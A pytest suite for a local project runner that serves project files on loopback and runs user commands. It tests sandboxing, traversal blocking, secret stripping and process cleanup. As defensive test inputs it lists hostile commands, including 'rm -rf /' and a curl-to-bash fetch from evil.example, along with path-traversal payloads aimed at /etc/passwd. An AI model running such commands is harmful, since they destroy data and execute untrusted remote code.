"""Vibe step 2b: show a project on localhost, run a command, stop it (docs/VIBE-PROJECTS-DESIGN.md).

Real sockets and real processes on this machine, inside temporary project folders. Every test
stops what it started, and every command line carries the marker `vibe-run-test` so the gates can
check that nothing is left running.
"""
from __future__ import annotations

import http.client
import os
import signal
import socket
import subprocess
import sys
import time

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

import codec_vibe_projects as vp
import codec_vibe_runner as vr

PY = sys.executable

SERVER = '''\
import http.server, os, socketserver, sys
port = int(os.environ["PORT"])
print("PORT=%d" % port, flush=True)
print("HOST=%s" % os.environ.get("HOST"), flush=True)
print("CWD=%s" % os.getcwd(), flush=True)
print("SECRET_SEEN=%s" % any(k in os.environ for k in ("FAKE_API_KEY", "MY_SECRET_TOKEN")), flush=True)
print("ARGS=%s" % " ".join(sys.argv[1:]), flush=True)
class H(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a): pass
socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("127.0.0.1", port), H) as s:
    s.serve_forever()
'''

SPAWNER = '''\
import subprocess, sys, time
child = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)  # vibe-run-test-child"])
print("CHILD=%d" % child.pid, flush=True)
time.sleep(60)
'''

EXITS = '''\
import sys
print("first line", flush=True)
print("second line", flush=True)
sys.exit(3)
'''


@pytest.fixture(autouse=True)
def _runner(tmp_path, monkeypatch):
    monkeypatch.setenv("CODEC_VIBE_ROOT", str(tmp_path / "vibe"))
    monkeypatch.setenv("CODEC_VIBE_TRASH", str(tmp_path / "trash"))
    monkeypatch.delenv("VIBE_PROJECTS_ENABLED", raising=False)
    monkeypatch.setenv("FAKE_API_KEY", "must-not-reach-the-command")
    monkeypatch.setenv("MY_SECRET_TOKEN", "must-not-reach-the-command")
    monkeypatch.setattr(vr, "_REAPED", False)
    vr.stop_all("test")
    yield
    vr.stop_all("test")


def _project(files=None):
    pid = vp.create_project("Runner", files or [])["id"]
    return pid


def _wait(cond, seconds=15.0, step=0.1):
    end = time.time() + seconds
    while time.time() < end:
        out = cond()
        if out:
            return out
        time.sleep(step)
    return None


def _get(port, path="/", method="GET", host=None, headers=None):
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
    h = {"Host": host or f"127.0.0.1:{port}"}
    h.update(headers or {})
    conn.request(method, path, headers=h)
    r = conn.getresponse()
    body = r.read()
    out = (r.status, {k.lower(): v for k, v in r.getheaders()}, body)
    conn.close()
    return out


def _alive(pid):
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return False
    return True


def _start_server(pid, extra_args=""):
    vp.write_file(pid, "vibe-run-test.py", SERVER)
    return vr.start_run(pid, f"{PY} vibe-run-test.py {extra_args} $PORT".strip())


def _ready(pid, seconds=15.0):
    return _wait(lambda: (lambda s: s if s["state"] == "ready" else None)(vr.status(pid)), seconds)


# ── the read-only file server ────────────────────────────────────────────

SITE = [
    {"path": "index.html", "content": "<!DOCTYPE html><h1>Home</h1><img src=logo.svg><script src=app.js></script>\n"},
    {"path": "app.js", "content": "fetch('data.json')\n"},
    {"path": "data.json", "content": '{"ok": true}\n'},
    {"path": "logo.svg", "content": '<svg xmlns="http://www.w3.org/2000/svg"></svg>\n'},
    {"path": "css/style.css", "content": "h1 { color: red }\n"},
    {"path": "about/index.html", "content": "<h1>About</h1>\n"},
]


def test_serve_shows_the_project_files_with_the_right_types_and_always_sandboxed():
    pid = _project(SITE)
    info = vr.start_serve(pid)
    port = info["port"]
    assert info["state"] == "ready" and info["kind"] == "serve" and port in vr.PORT_RANGE
    assert info["url"] == f"http://127.0.0.1:{port}/"
    status, h, body = _get(port, "/")
    assert status == 200 and b"<h1>Home</h1>" in body
    assert h["content-type"] == "text/html; charset=utf-8"
    assert h["content-security-policy"].startswith("sandbox allow-scripts")
    assert "allow-same-origin" not in h["content-security-policy"]
    assert h["x-content-type-options"] == "nosniff" and h["cache-control"] == "no-store"
    assert h["access-control-allow-origin"] == "*"
    for path, ctype in (("/app.js", "javascript"), ("/data.json", "application/json"),
                        ("/logo.svg", "image/svg+xml"), ("/css/style.css", "text/css")):
        s, hh, _b = _get(port, path)
        assert s == 200 and ctype in hh["content-type"], (path, hh["content-type"])
    s, _h, b = _get(port, "/about/")
    assert s == 200 and b"About" in b
    s, hh, _b = _get(port, "/about")
    assert s == 301 and hh["location"] == "/about/"
    s, hh, b = _get(port, "/", method="HEAD")
    assert s == 200 and b == b"" and int(hh["content-length"]) > 10
    assert _get(port, "/missing.html")[0] == 404
    assert _get(port, "/css/")[0] == 404, "a folder without index.html is not listed"


def test_serve_never_shows_dot_folders_dotfiles_or_anything_outside_the_project(tmp_path):
    pid = _project(SITE)
    (tmp_path / "outside.txt").write_text("outside")
    pdir = vp.project_dir(pid)
    os.symlink(tmp_path / "outside.txt", pdir / "peek.txt")
    os.symlink(pdir / ".vibe" / "project.json", pdir / "meta.txt")
    (pdir / ".secret").write_text("dotfile")
    port = vr.start_serve(pid)["port"]
    for path in ("/.vibe/project.json", "/.vibe/checkpoints.jsonl", "/.git/config", "/.secret",
                 "/%2e%76ibe/project.json", "/%2e%2e/%2e%2e/etc/passwd", "/../../etc/passwd",
                 "//etc/passwd", "/css/..%2f..%2f..%2fetc/passwd", "/a\\..\\b", "/peek.txt", "/meta.txt",
                 "/index.html%00.png", "/%ff"):
        status, _h, body = _get(port, path)
        assert status in (400, 404), (path, status)
        assert b"outside" not in body and b"project" not in body.lower().replace(b"projects", b"")


def test_serve_answers_only_get_and_head_and_only_to_the_right_host():
    pid = _project(SITE)
    port = vr.start_serve(pid)["port"]
    for method in ("POST", "PUT", "DELETE", "PATCH", "OPTIONS"):
        s, h, _b = _get(port, "/", method=method)
        assert s == 405 and h["allow"] == "GET, HEAD", method
    assert _get(port, "/", host="evil.example")[0] == 403
    assert _get(port, "/", host="evil.example:%d" % port)[0] == 403
    assert _get(port, "/", host="127.0.0.1:%d" % (port + 1))[0] == 403
    assert _get(port, "/", host="127.0.0.1")[0] == 403
    assert _get(port, "/", host="localhost:%d" % port)[0] == 200


def test_serve_listens_on_loopback_only_and_follows_edits():
    pid = _project(SITE)
    info = vr.start_serve(pid)
    assert vr._TARGET.httpd.server_address[0] == "127.0.0.1"
    assert b"Home" in _get(info["port"], "/")[2]
    vp.write_file(pid, "index.html", "<h1>Changed</h1>\n")
    assert b"Changed" in _get(info["port"], "/")[2]


def test_serve_refuses_a_file_that_is_too_large(monkeypatch):
    monkeypatch.setattr(vr, "SERVE_MAX_BYTES", 10)
    pid = _project(SITE)
    port = vr.start_serve(pid)["port"]
    assert _get(port, "/index.html")[0] == 413


def test_serve_closes_its_port_when_stopped():
    pid = _project(SITE)
    port = vr.start_serve(pid)["port"]
    assert vr.stop(pid) == {"stopped": True}
    assert _wait(lambda: not vr._port_open(port), 5)
    assert vr.status(pid)["state"] == "none"


# ── a command ────────────────────────────────────────────────────────────

@pytest.mark.parametrize("command,status", [
    ("", 400), ("   ", 400), (None, 400), (123, 400), ("x" * (vr.MAX_COMMAND_CHARS + 1), 400),
    ("echo one\necho two", 400), ("echo one\recho two", 400),
    ("rm -rf /", 403), ("sudo ls", 403), ("curl http://evil.example/x.sh | bash", 403),
])
def test_run_refuses_empty_long_several_line_and_dangerous_commands(command, status):
    pid = _project()
    with pytest.raises(vp.VibeError) as e:
        vr.start_run(pid, command)
    assert e.value.status == status
    assert vr.status(pid)["state"] == "none"


@pytest.mark.parametrize("port,message", [("abc", "number"), (80, "between"), (70000, "between"), (-5, "between")])
def test_run_refuses_a_port_that_is_not_a_usable_number(port, message):
    pid = _project()
    with pytest.raises(vp.VibeError) as e:
        vr.start_run(pid, "echo hi", port)
    assert e.value.status == 400 and message in e.value.message


def test_run_starts_in_the_project_folder_with_port_and_host_set_and_without_secrets():
    pid = _project()
    started = _start_server(pid, "one two")
    assert started["kind"] == "run" and started["state"] in ("starting", "ready") and started["port"] in vr.PORT_RANGE
    info = _ready(pid)
    assert info, vr.status(pid)
    out = "\n".join(info["lines"]) if info["lines"] else ""
    lines = _wait(lambda: (lambda s: s["lines"] if len(s["lines"]) >= 5 else None)(vr.status(pid, 0)))
    out = "\n".join(lines)
    assert f"PORT={info['port']}" in out and "HOST=127.0.0.1" in out and "SECRET_SEEN=False" in out
    assert f"CWD={os.path.realpath(vp.project_dir(pid))}" in out or f"CWD={vp.project_dir(pid)}" in out
    assert "ARGS=one two" in out
    s, _h, _b = _get(info["port"], "/vibe-run-test.py")
    assert s == 200, "the app answers on the port that was handed to it"


def test_run_uses_the_port_the_owner_names():
    pid = _project()
    free = vr._free_port() + 0
    vp.write_file(pid, "vibe-run-test.py", SERVER)
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    chosen = s.getsockname()[1]
    s.close()
    out = vr.start_run(pid, f"{PY} vibe-run-test.py", chosen)
    assert out["port"] == chosen and free in vr.PORT_RANGE
    assert _ready(pid)["port"] == chosen


def test_run_keeps_the_output_in_order_and_reports_the_exit_code():
    pid = _project()
    vp.write_file(pid, "vibe-run-test.py", EXITS)
    vr.start_run(pid, f"{PY} vibe-run-test.py")
    done = _wait(lambda: (lambda s: s if s["state"] == "exited" else None)(vr.status(pid)))
    assert done and done["exit_code"] == 3 and done["lines"] == ["first line", "second line"]
    later = vr.status(pid, since=1)
    assert later["lines"] == ["second line"] and later["next"] == 2
    assert vr.status(pid, since=99)["lines"] == []
    assert vr.status(pid, since="junk")["lines"] == ["first line", "second line"]


def test_run_cuts_very_long_lines_and_keeps_only_the_latest_lines(monkeypatch):
    monkeypatch.setattr(vr, "LOG_LINES", 5)
    pid = _project()
    vp.write_file(pid, "vibe-run-test.py", "for i in range(20):\n    print(str(i) + 'x' * 2000, flush=True)\n")
    vr.start_run(pid, f"{PY} vibe-run-test.py")
    done = _wait(lambda: (lambda s: s if s["state"] == "exited" else None)(vr.status(pid)))
    assert done and len(done["lines"]) == 5 and all(len(x) <= vr.LOG_LINE_CHARS for x in done["lines"])
    assert done["lines"][-1].startswith("19x") and done["next"] == 20


def test_run_status_of_another_project_says_none():
    a, b = _project(), _project()
    _start_server(a)
    assert vr.status(b)["state"] == "none"
    assert vr.stop(b) == {"stopped": False}
    assert vr.status(a)["state"] in ("starting", "ready")


# ── stop, replace, idle, reap ────────────────────────────────────────────

def test_stop_kills_the_whole_process_group_including_children_the_command_started():
    pid = _project()
    vp.write_file(pid, "vibe-run-test.py", SPAWNER)
    vr.start_run(pid, f"{PY} vibe-run-test.py")
    lines = _wait(lambda: (lambda s: s["lines"] if s["lines"] else None)(vr.status(pid)))
    child = int(lines[0].split("=")[1])
    parent = vr._TARGET.proc.pid
    assert _alive(child) and _alive(parent)
    assert vr.stop(pid) == {"stopped": True}
    assert _wait(lambda: not _alive(child) and not _alive(parent), 5), "the child outlived the stop"
    assert not vr._run_file(vp.project_dir(pid)).exists()


def test_stop_with_nothing_running_says_so():
    pid = _project()
    assert vr.stop(pid) == {"stopped": False}


def test_stop_an_ended_command_does_not_signal_anything_late(monkeypatch):
    pid = _project()
    vp.write_file(pid, "vibe-run-test.py", EXITS)
    vr.start_run(pid, f"{PY} vibe-run-test.py")
    _wait(lambda: vr.status(pid)["state"] == "exited")
    sent = []
    monkeypatch.setattr(os, "killpg", lambda *a: sent.append(a))
    vr._TARGET.exited_at = time.time() - 60
    assert vr.stop(pid) == {"stopped": True}
    assert sent == [], "a number that ended a minute ago may belong to another process now"


def test_replace_starting_something_else_stops_the_old_one():
    a, b = _project(SITE), _project(SITE)
    _start_server(a)
    first = vr._TARGET.proc.pid
    assert _ready(a)
    info = vr.start_serve(b)
    assert _wait(lambda: not _alive(first), 5)
    assert vr.status(a)["state"] == "none" and vr.status(b)["port"] == info["port"]
    vr.start_run(a, f"{PY} vibe-run-test.py")
    assert vr.status(b)["state"] == "none"


def test_idle_stops_what_nobody_asks_about_and_asking_keeps_it_alive(monkeypatch):
    monkeypatch.setattr(vr, "IDLE_SECONDS", 0.6)
    monkeypatch.setattr(vr, "WATCH_INTERVAL", 0.1)
    pid = _project(SITE)
    port = vr.start_serve(pid)["port"]
    end = time.time() + 1.5
    while time.time() < end:                 # the page keeps asking: it stays
        assert vr.status(pid)["state"] == "ready"
        time.sleep(0.15)
    assert _wait(lambda: vr._TARGET is None, 3), "an unused server was not stopped"
    assert _wait(lambda: not vr._port_open(port), 3)


def test_reap_stops_a_process_an_earlier_dashboard_left_and_ignores_a_reused_number(tmp_path):
    import json
    pid = _project()
    vp.write_file(pid, "vibe-run-test.py", "import time\ntime.sleep(60)\n")
    pdir = vp.project_dir(pid)
    orphan = subprocess.Popen([PY, "vibe-run-test.py"], cwd=pdir, start_new_session=True)
    stranger = subprocess.Popen([PY, "-c", "import time; time.sleep(60)  # vibe-run-test-stranger"], start_new_session=True)
    try:
        vr._run_file(pdir).write_text(json.dumps({"pid": orphan.pid, "lstart": vr._ps_start(orphan.pid), "port": 5399}))
        other = _project()
        vr._run_file(vp.project_dir(other)).write_text(json.dumps({"pid": stranger.pid, "lstart": "Mon Jan  1 00:00:00 2001", "port": 5398}))
        vr._REAPED = False
        vr.start_serve(pid)                  # anything that starts something cleans up first
        assert _wait(lambda: orphan.poll() is not None, 5), "the leftover process was not stopped"
        assert stranger.poll() is None, "a process with a different start time must not be touched"
        assert not vr._run_file(pdir).exists() and not vr._run_file(vp.project_dir(other)).exists()
    finally:
        for p in (orphan, stranger):
            try:
                os.killpg(p.pid, signal.SIGKILL)
            except ProcessLookupError:
                pass
            p.wait()


def test_stop_all_stops_what_is_running_and_is_safe_to_repeat():
    pid = _project(SITE)
    port = vr.start_serve(pid)["port"]
    vr.stop_all()
    vr.stop_all()
    assert _wait(lambda: not vr._port_open(port), 5)


# ── routes ───────────────────────────────────────────────────────────────

def _client():
    from routes.vibe_projects import router as projects
    from routes.vibe_runner import router as runner
    app = FastAPI()
    app.include_router(projects)
    app.include_router(runner)
    return TestClient(app)


def test_api_serve_run_status_and_stop_round_trip():
    c = _client()
    pid = c.post("/api/vibe/projects", json={"title": "Api run", "files": SITE}).json()["id"]
    served = c.post(f"/api/vibe/projects/{pid}/serve")
    assert served.status_code == 200 and served.json()["kind"] == "serve"
    assert b"Home" in _get(served.json()["port"], "/")[2]
    assert c.get(f"/api/vibe/projects/{pid}/live").json()["state"] == "ready"
    assert c.post(f"/api/vibe/projects/{pid}/stop").json() == {"stopped": True}
    assert c.get(f"/api/vibe/projects/{pid}/live").json()["state"] == "none"

    vp.write_file(pid, "vibe-run-test.py", SERVER)
    run = c.post(f"/api/vibe/projects/{pid}/run", json={"command": f"{PY} vibe-run-test.py"})
    assert run.status_code == 200 and run.json()["kind"] == "run"
    live = _wait(lambda: (lambda j: j if j["state"] == "ready" else None)(c.get(f"/api/vibe/projects/{pid}/live?since=0").json()))
    assert live and live["lines"] and live["url"].startswith("http://127.0.0.1:5")
    assert c.post(f"/api/vibe/projects/{pid}/stop").json() == {"stopped": True}


def test_api_answers_403_to_a_request_that_did_not_come_from_this_mac():
    c = _client()
    pid = c.post("/api/vibe/projects", json={"title": "Remote", "files": SITE}).json()["id"]
    for headers in ({"x-forwarded-for": "203.0.113.9"}, {"cf-connecting-ip": "203.0.113.9"}):
        assert c.post(f"/api/vibe/projects/{pid}/serve", headers=headers).status_code == 403
        assert c.post(f"/api/vibe/projects/{pid}/run", json={"command": "echo hi"}, headers=headers).status_code == 403
        assert c.get(f"/api/vibe/projects/{pid}/live", headers=headers).status_code == 403
        assert c.post(f"/api/vibe/projects/{pid}/stop", headers=headers).status_code == 403
    assert vr._TARGET is None, "a refused request must not start anything"


def test_api_is_switched_off_with_the_projects_switch(monkeypatch):
    c = _client()
    pid = c.post("/api/vibe/projects", json={"title": "Off"}).json()["id"]
    monkeypatch.setenv("VIBE_PROJECTS_ENABLED", "false")
    for r in (c.post(f"/api/vibe/projects/{pid}/serve"), c.get(f"/api/vibe/projects/{pid}/live"),
              c.post(f"/api/vibe/projects/{pid}/stop"), c.post(f"/api/vibe/projects/{pid}/run", json={"command": "x"})):
        assert r.status_code == 404
    assert vr._TARGET is None


def test_api_rejects_bad_ids_bodies_commands_and_ports():
    c = _client()
    pid = c.post("/api/vibe/projects", json={"title": "Bad"}).json()["id"]
    assert c.post("/api/vibe/projects/NOT_VALID!/serve").status_code in (400, 404)
    assert c.post("/api/vibe/projects/abc-000000/serve").status_code == 404
    assert c.post(f"/api/vibe/projects/{pid}/run", content=b"nope", headers={"content-type": "application/json"}).status_code == 400
    assert c.post(f"/api/vibe/projects/{pid}/run", json=["x"]).status_code == 400
    assert c.post(f"/api/vibe/projects/{pid}/run", json={}).status_code == 400
    assert c.post(f"/api/vibe/projects/{pid}/run", json={"command": "rm -rf /"}).status_code == 403
    assert c.post(f"/api/vibe/projects/{pid}/run", json={"command": "echo hi", "port": "abc"}).status_code == 400
    assert c.get(f"/api/vibe/projects/{pid}/live?since=-4").json()["state"] == "none"
    assert vr._TARGET is None


def test_audit_events_carry_ids_ports_and_lengths_never_the_command(monkeypatch):
    seen = []
    import codec_audit
    monkeypatch.setattr(codec_audit, "log_event", lambda *a, **k: seen.append((a, k)))
    pid = _project(SITE)
    vr.start_serve(pid)
    vp.write_file(pid, "vibe-run-test.py", SERVER)
    vr.start_run(pid, f"{PY} vibe-run-test.py SECRETWORD-in-the-command")
    vr.stop(pid)
    names = [a[0] for a, _k in seen]
    assert names.count("vibe_project_run") == 2 and names.count("vibe_project_stop") == 2
    reasons = [k["extra"]["reason"] for a, k in seen if a[0] == "vibe_project_stop"]
    assert reasons == ["replaced", "user"]
    run_event = [k["extra"] for a, k in seen if a[0] == "vibe_project_run"][1]
    assert run_event["kind"] == "run" and run_event["command_chars"] > 20 and run_event["port"] in vr.PORT_RANGE
    blob = repr(seen)
    for forbidden in ("SECRETWORD", "vibe-run-test.py", PY, "must-not-reach"):
        assert forbidden not in blob, f"audit leaked {forbidden!r}"


# ── the dashboard policy ────────────────────────────────────────────────

def test_csp_lets_the_page_frame_127_0_0_1_and_nothing_else_new():
    from codec_dashboard import CSPMiddleware
    csp = CSPMiddleware.CSP
    frame = [d.strip() for d in csp.split(";") if d.strip().startswith("frame-src")]
    assert frame == ["frame-src 'self' http://127.0.0.1:*"]
    assert "frame-ancestors 'self' https://avadigital.ai" in csp and "unsafe-eval" not in csp
    assert "default-src 'self'" in csp
